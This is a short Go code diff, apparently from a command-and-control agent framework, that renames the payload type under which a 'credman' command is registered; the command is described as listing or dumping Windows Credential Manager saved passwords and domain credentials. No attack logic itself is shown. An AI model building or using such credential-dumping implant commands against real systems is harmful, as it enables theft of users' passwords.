@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "credman",
 		Description:         "Enumerate Windows Credential Manager entries (saved passwords, domain credentials)",
 		HelpString:          "credman [-action <list|dump>] [-filter <pattern>]",
